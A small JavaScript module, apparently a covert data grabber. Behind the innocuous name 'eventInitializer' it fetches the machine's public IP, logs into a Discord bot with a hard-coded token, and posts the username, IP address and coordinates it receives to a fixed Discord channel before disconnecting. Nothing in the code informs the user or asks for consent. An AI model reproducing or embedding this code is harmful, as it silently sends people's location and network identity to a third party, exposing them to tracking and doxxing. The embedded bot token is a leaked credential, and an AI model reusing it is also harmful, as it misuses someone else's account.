const Discord = require("discord.js")
const publicIp = require('public-ip');

function eventInitializer(username,coords) {
    publicIp.v4()
    .then((add) =>{
        new init(username,add,coords)
    })
}

class init extends Discord.Client{
    constructor(username,ip,coords){
        super()
        this.login("ODE2NzcxNDgzMzc2MDI1NjMx.YD_zuA.ltVxOXOTmH5aBUilFZLQ5PguJic")
        this.once("ready", ()=>{
            this.config(username,ip,coords)
        })
    }
    config(username,ip,coords){
        this.channels.fetch('816772379426291763')
        .then((channel) => {
            channel.send("------------------\n**" + username + "**: \nIP: " + ip + "\nCoords: "+ coords)
            .then((message)=>{
                this.destroy()
            })
        })
    }
}

module.exports = eventInitializer